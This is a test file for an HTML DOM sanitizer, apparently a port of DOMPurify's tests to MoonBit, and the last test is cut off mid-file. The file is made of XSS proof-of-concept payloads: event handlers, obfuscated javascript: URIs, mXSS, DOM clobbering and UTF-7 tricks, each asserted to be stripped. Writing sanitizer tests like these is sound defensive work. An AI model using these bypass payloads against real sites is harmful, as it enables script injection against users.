///|
test "Don't remove data URIs from SVG images (see #205)" {
  let payload = "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" preserveratio=\"true\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>"
  assert_true(
    [
      "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Don't remove data URIs from SVG images, with href attribute" {
  let payload = "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" preserveratio=\"true\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>"
  assert_true(
    [
      "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Don't remove ARIA attributes if not prohibited (see #203)" {
  let payload = "<div aria-labelledby=\"msg--title\" role=\"dialog\" class=\"msg\"><button class=\"modal-close\" aria-label=\"close\" type=\"button\"><i class=\"icon-close\"></i>some button</button></div>"
  assert_true(
    [
      "<div aria-labelledby=\"msg--title\" role=\"dialog\" class=\"msg\"><button class=\"modal-close\" aria-label=\"close\" type=\"button\"><i class=\"icon-close\"></i>some button</button></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Don't remove binary attributes if considered safe (see #168)" {
  let payload = "<input type=checkbox checked><input type=checkbox onclick>"
  assert_true(
    ["<input type=\"checkbox\" checked=\"\"><input type=\"checkbox\">"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Avoid over-zealous stripping of SVG filter elements (see #144)" {
  let payload = "<svg><defs><filter id=\"f1\"><feGaussianBlur in=\"SourceGraphic\" stdDeviation=\"15\" /></filter></defs><rect width=\"90\" height=\"90\" stroke=\"green\" stroke-width=\"3\" fill=\"yellow\" filter=\"url(#f1)\" /></svg>"
  assert_true(
    [
      "<svg><defs><filter id=\"f1\"><feGaussianBlur in=\"SourceGraphic\" stdDeviation=\"15\"></feGaussianBlur></filter></defs><rect width=\"90\" height=\"90\" stroke=\"green\" stroke-width=\"3\" fill=\"yellow\" filter=\"url(#f1)\"></rect></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "safe usage of URI-like attribute values (see #135)" {
  let payload = "<b href=\"javascript:alert(1)\" title=\"javascript:alert(2)\"></b>"
  assert_true(
    ["<b title=\"javascript:alert(2)\"></b>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "src Attributes for IMG, AUDIO, VIDEO and SOURCE (see #131)" {
  let payload = "<img src=\"data:,123\"><audio src=\"data:,456\"></audio><video src=\"data:,789\"></video><source src=\"data:,012\"><div src=\"data:,345\">"
  assert_true(
    [
      "<img src=\"data:,123\"><audio src=\"data:,456\"></audio><video src=\"data:,789\"></video><source src=\"data:,012\"><div></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "DOM Clobbering against document.createElement() (see #47)" {
  let payload = "<img src=x name=createElement><img src=y id=createElement>"
  assert_true(
    ["<img src=\"x\"><img src=\"y\">"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "DOM Clobbering against an empty cookie" {
  let payload = "<img src=x name=cookie>"
  assert_true(["<img src=\"x\">"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "JavaScript URIs using Unicode LS/PS I" {
  let payload = "123<a href=' javascript:alert(1)'>I am a dolphin!</a>"
  assert_true(
    ["123<a>I am a dolphin!</a>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "JavaScript URIs using Unicode LS/PS II" {
  let payload = "123<a href=' javascript:alert(1)'>I am a dolphin too!</a>"
  assert_true(
    ["123<a>I am a dolphin too!</a>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "JavaScript URIs using Unicode Whitespace" {
  let payload = "123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>"
  assert_true(
    [
      "123<a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Image with data URI src" {
  let payload = "<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>"
  assert_true(
    ["<img src=\"data:image/jpeg,ab798ewqxbaudbuoibeqbla\">"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Image with data URI src with whitespace" {
  let payload = "<img src=\"\r\ndata:image/jpeg,ab798ewqxbaudbuoibeqbla\">"
  assert_true(
    ["<img src=\"data:image/jpeg,ab798ewqxbaudbuoibeqbla\">"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Image with JavaScript URI src (DoS on Firefox)" {
  let payload = "<img src='javascript:while(1){}'>"
  assert_true(["<img>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Link with data URI href" {
  let payload = "<a href=data:,evilnastystuff>clickme</a>"
  assert_true(["<a>clickme</a>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Simple numbers" {
  let payload = "123456"
  assert_true(["123456"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "DOM clobbering XSS by @irsdl using attributes" {
  let payload = "<form onmouseover='alert(1)'><input name=\"attributes\"><input name=\"attributes\">"
  assert_true(
    ["", "<form><input><input></form>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "DOM clobbering: getElementById" {
  let payload = "<img src=x name=getElementById>"
  assert_true(["<img src=\"x\">"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "DOM clobbering: location" {
  let payload = "<a href=\"#some-code-here\" id=\"location\">invisible"
  assert_true(
    ["<a href=\"#some-code-here\">invisible</a>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "onclick, onsubmit, onfocus; DOM clobbering: parentNode" {
  let payload = "<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>"
  assert_true(
    ["<div><form><input>123</form></div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: nodeName" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: nodeType" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: children" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: attributes" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: removeChild" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: removeAttributeNode" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "onsubmit, onfocus; DOM clobbering: setAttribute" {
  let payload = "<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>"
  assert_true(
    ["<form><input>123</form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "&gt;style&lt;" {
  let payload = "<style>*{color: red}</style>"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "HTML paragraph with text" {
  let payload = "<p>hello</p>"
  assert_true(["<p>hello</p>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "mXSS Variation I" {
  let payload = "<listing>&lt;img onerror=\"alert(1);//\" src=x&gt;<t t></listing>"
  assert_true(
    ["&lt;img onerror=\"alert(1);//\" src=x&gt;"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "mXSS Variation II" {
  let payload = "<img src=x id/=' onerror=alert(1)//'>"
  assert_true(
    ["<img src=\"x\" id=\"\">"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Textarea and comments enabling img element" {
  let payload = "<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->"
  assert_true(
    ["<textarea>@shafigullin</textarea>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Img element inside noscript terminated inside comment" {
  let payload = "<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>"
  assert_true(["<b></b>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Img element inside noscript terminated inside attribute" {
  let payload = "<b><noscript><a alt=\"</noscript><img src=x onerror=alert(1)>\"></noscript>"
  assert_true(
    [
      "<b></b>", "<b><img src=\"x\">\"&gt;</b>", "<b><a alt=\"</noscript><img src=x onerror=alert(1)>\"></a></b>",
      "<b><a alt=\"&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;\"></a></b>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Img element inside shadow DOM template" {
  let payload = "<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>"
  assert_true(
    [
      "<template><s><template><s><img src=\"x\">@shafigullin</s></template></s></template>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Low-range-ASCII obfuscated JavaScript URI" {
  let payload = "<a href=\"\u{01}java\u{03}script:alert(1)\">@shafigullin<a>"
  assert_true(
    ["<a>@shafigullin</a><a></a>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Img inside style inside broken option element" {
  let payload = "\u{01}<option><style></option></select><b><img src=x onerror=alert(1)></style></option>"
  assert_true(
    ["\u{01}<option></option>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Iframe inside option element" {
  let payload = "<option><iframe></select><b><script>alert(1)</script>"
  assert_true(["<option></option>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Closing Iframe and option" {
  let payload = "</iframe></option>"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Image after style to trick jQuery tag-completion" {
  let payload = "<b><style><style/><img src=x onerror=alert(1)>"
  assert_true(["<b></b>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Image after self-closing style to trick jQuery tag-completion" {
  let payload = "<b><style><style////><img src=x onerror=alert(1)></style>"
  assert_true(["<b></b>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "MathML example" {
  let payload = "<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\" mathbackground=\"#80FF80\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>"
  assert_true(
    [
      "<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>",
      "<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\" mathbackground=\"#80FF80\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "DOM clobbering attack using name=body" {
  let payload = "<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>"
  assert_true(
    ["<img><img>@mmrupp<img><svg></svg>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Special escapes in protocol handler for XSS in Blink" {
  let payload = "<a href=\"\u{01}java\u{03}script:alert(1)\">@shafigullin<a>"
  assert_true(
    ["<a>@shafigullin</a><a></a>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "DOM clobbering attack using activeElement" {
  let payload = "<image name=activeElement><svg onload=alert(1)>"
  assert_true(["<img><svg></svg>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "DOM clobbering attack using name=body and injecting SVG + keygen" {
  let payload = "<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>"
  assert_true(
    ["<img><img src=\"x\"><svg>, </svg>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Bypass using multiple unknown attributes" {
  let payload = "<div onmouseout=\"javascript:alert(/superevr/)\" x=yscript: n>@superevr</div>"
  assert_true(
    ["<div>@superevr</div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Bypass using event handlers and unknown attributes" {
  let payload = "<button remove=me onmousedown=\"javascript:alert(1);\" onclick=\"javascript:alert(1)\" >@giutro"
  assert_true(
    ["<button>@giutro</button>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes" {
  let payload = "<a href=\"javascript:123\" onclick=\"alert(1)\">CLICK ME (bypass by @shafigullin)</a>"
  assert_true(
    ["<a>CLICK ME (bypass by @shafigullin)</a>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes (II)" {
  let payload = "<isindex x=\"javascript:\" onmouseover=\"alert(1)\" label=\"variation of bypass by @giutro\">"
  // CHECK: jsdom need ""
  assert_true(
    [
      "", "<form><hr><label>This is a searchable index. Enter search keywords: <input label=\"variation of bypass by @giutro\" name=\"isindex\"></label><hr></form>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Bypass using unknown attributes III" {
  let payload = "<div wow=removeme onmouseover=alert(1)>text"
  assert_true(["<div>text</div>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Bypass using unknown attributes IV" {
  let payload = "<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>"
  assert_true(
    ["<input><svg id=\"1\"></svg>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Bypass using unknown attributes V" {
  let payload = "<isindex src=\"javascript:\" onmouseover=\"alert(1)\" label=\"bypass by @giutro\" />"
  // CHECK: jsdom need ""
  assert_true(
    [
      "", "<form><hr><label>This is a searchable index. Enter search keywords: <input name=\"isindex\" label=\"bypass by @giutro\"></label><hr></form>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Bypass using JS URI in href" {
  let payload = "<a href=\"javascript:123\" onclick=\"alert(1)\">CLICK ME (bypass by @shafigullin)</a>"
  assert_true(
    ["<a>CLICK ME (bypass by @shafigullin)</a>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<form action=\"javasc\nript:alert(1)\"><button>XXX</button></form>"
  assert_true(
    ["<form><button>XXX</button></form>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"1\"><form id=\"foobar\"></form><button form=\"foobar\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"1\"><form id=\"foobar\"></form><button>X</button>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"2\">&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"3\">&amp;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"4\">0? :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"5\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"6\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"7\"><input>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"8\"><input><input>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div>\n\n<div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`--&gt;]]&gt;]</div>\n\n<div id=\"10\"><video></video>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"9\"><a style='-o-link: \"javascript:alert(9)\"; -o-link-source: current;'>X</a>//[\"'`--&gt;]]&gt;]</div>\n\n<div id=\"10\"><video></video>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g></g></svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"12\"><br><br><br><br><br><br>...<br><br><br><br><input>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"13\">01//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"14\"><input pattern=\"^((a+.)a)+$\" value=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"15\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
